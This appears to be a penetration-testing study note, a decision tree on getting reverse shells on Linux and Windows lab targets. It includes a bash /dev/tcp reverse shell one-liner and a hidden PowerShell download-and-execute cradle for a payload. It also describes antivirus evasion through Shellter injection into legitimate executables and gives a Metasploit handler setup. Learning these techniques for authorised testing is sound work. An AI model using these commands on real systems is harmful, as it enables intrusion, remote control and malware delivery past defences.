# Shells & Payloads, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for reverse shells and shell delivery.

---

### Got code execution, need a reverse shell
→ Linux target: `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"`, URL-encode it if going through a web parameter
→ Windows target: PowerShell one-liner, base64-encode with Unicode first, deliver via `powershell -enc`
→ Always start the listener (`nc -nvlp <port>`) *before* triggering
→ See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (Linux) and [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (Windows)
→ Generalized command reference: [[Linux Methodology#Step 2: Shells & Payloads|Linux]] / [[Windows Methodology#Step 2: Shells & Payloads|Windows]]

### Reverse shell landed
→ Immediately check `whoami` / `id` and `sudo -l` (Linux) or `whoami /priv` (Windows) before assuming you need to escalate. Web server processes on training VMs are often already root/SYSTEM

### `python3 -m http.server` isn't serving the file you expect (404s, or netcat never catches anything)
→ It serves whatever directory it was launched from. `cd` into the exact folder immediately before starting it, and check the server's own access log for a `200` before assuming the listener is broken
→ Full story: [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3 troubleshooting box]]

---

### Windows target and your .exe payload is getting caught by AV
→ Option 1: **PowerShell IEX in-memory injection** -- serve a `.ps1` reverse shell from Kali's HTTP server, victim runs it via download cradle, payload never touches disk so AV's on-access scanner has nothing to catch
  `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"`
→ Option 2: **Shellter PE injection** -- inject shellcode into a legitimate 32-bit Windows .exe (PuTTY, Spotify, etc.), AV sees a known-good binary envelope. Needs `wine32:i386` on Kali first, and a `WINEARCH=win32 wineboot` prefix reset if Wine ran before wine32 was installed
→ Option 3: **.bat wrapper** -- same IEX trick as Option 1 but packaged as a double-clickable `.bat` file, useful when PowerShell-direct execution is blocked but script delivery via FTP/SMB works
→ Mechanics of the PS flags: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]]
→ Full technique reference: [[Antivirus Evasion]]

### Shellter payload menu shows `[stager]`, or nc catches the connection then immediately drops it
→ The `[stager]` label means the binary is a two-stage payload: the first stage connects to your listener and asks for the second stage payload to be sent back. **nc has no idea how to respond to that request** -- it accepts the TCP connection, the stager sends its "give me stage 2" bytes, nc sends nothing back, both sides hang up
→ Use msfconsole `multi/handler` instead:
  ```
  use multi/handler
  set PAYLOAD windows/shell/reverse_tcp      # slash = staged shell; must match the binary type
  set LHOST <kali_ip>
  set LPORT <port>
  run
  ```
→ Slash vs underscore matters: `windows/shell/reverse_tcp` (slash, staged) is correct. `windows/shell_reverse_tcp` (underscore, stageless) gives "Session is not valid and will be closed" immediately if your binary is a stager
→ For Meterpreter stagers: `set PAYLOAD windows/meterpreter/reverse_tcp` (slash)
→ Mechanics of why staged payloads need a handler: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]]
→ Seen live: [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|Antivirus Evasion, 15.3.3]]

#### Tags: #AntivirusEvasion #Shellter #StagedPayload #PowerShellInjection #MultiHandler
